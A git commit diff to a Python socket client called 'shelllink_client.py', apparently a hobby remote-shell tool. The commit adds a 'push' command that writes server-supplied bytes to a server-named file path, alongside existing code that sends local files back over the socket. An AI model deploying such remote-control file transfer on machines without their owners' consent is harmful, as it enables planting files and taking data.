a9cf880dc0d6a323f0b9ee3e319f082154c48bc4
Sumeet <sahoosumeet555@gmail.com>
2025-06-28 01:51:20 +0530

    compleated the push and pull commands

--- shelllink_client.py
+++ shelllink_client.py
@@ -29,9 +29,27 @@ while True:
                     while out:s.send(out)
             except FileNotFoundError:
                 s.send(str(-1).encode().ljust(16))
+                print("file not found ",flush=True)
             except Exception as e:
                 s.send(str(-2).encode().ljust(16))
                 s.send(str(e).encode())
+                print("error : ",e,flush=True)
+            print(os.getcwd()+">",end=" ",flush=True)
+            s.send(str.encode(os.getcwd()+">"))
+
+        elif data[:4]=="push":
+            filesize=int(s.recv(16).decode().strip())  #get the filesize
+            if filesize>=0:
+                received=0
+                with open(data[5:],'wb') as f:
+                    while received<filesize:
+                        response=s.recv(min(1024, filesize - received))
+                        f.write(response)
+                        received+=len(response)
+            elif filesize==-1:
+                print("file not found ",flush=True)
+            else:
+                print(str(s.recv(1024),"utf-8"))
             print(os.getcwd()+">",end=" ",flush=True)
             s.send(str.encode(os.getcwd()+">"))
         else:
